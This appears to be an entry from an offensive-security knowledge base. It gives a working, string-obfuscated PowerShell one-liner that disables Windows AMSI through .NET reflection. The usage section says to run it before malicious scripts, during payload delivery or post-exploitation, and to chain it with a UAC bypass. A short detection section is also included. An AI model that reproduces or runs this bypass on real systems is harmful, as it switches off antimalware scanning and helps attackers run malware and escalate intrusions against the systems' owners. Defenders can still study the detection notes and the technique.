---
type: code
language: powershell
verified: true
tags:
  - amsi-bypass
  - reflection
  - defense-evasion
platforms:
  - Windows
validated: true
---

# PowerShell-Reflection-AMSI-Bypass

## Code

```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

## Description

This PowerShell code uses .NET reflection to disable the Antimalware Scan Interface (AMSI) by setting the private amsiInitFailed field to True in the System.Management.Automation.AmsiUtils class. Obfuscated string concatenation evades basic static analysis. It allows execution of scripts that would otherwise be blocked by Windows Defender or other AMSI-integrated security tools.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This code has no user-defined variables; it uses hardcoded reflection paths. | N/A |

## Usage

Execute directly in a PowerShell session (elevated preferred) before running malicious scripts. Commonly used in initial payload delivery or post-exploitation to unblock further actions like downloading additional tools. Chain with UAC bypass for privilege escalation. Test success by attempting to run obfuscated or known-malicious code.

## Detection

- Monitor PowerShell event logs for reflection invocations (Event ID 4103/4104) or AMSI initialization failures (Event ID 1102).
- EDR tools can hook .NET method calls to AmsiUtils or detect delegate creation patterns.
- Behavioral detection of PowerShell accessing private fields via reflection.
- Sysmon rules for process creation with PowerShell parent and network/DLL loads.

## Related

- [[procedures/Bypass-AMSI-and-WMF5-Autologging-Using-Reflection]]
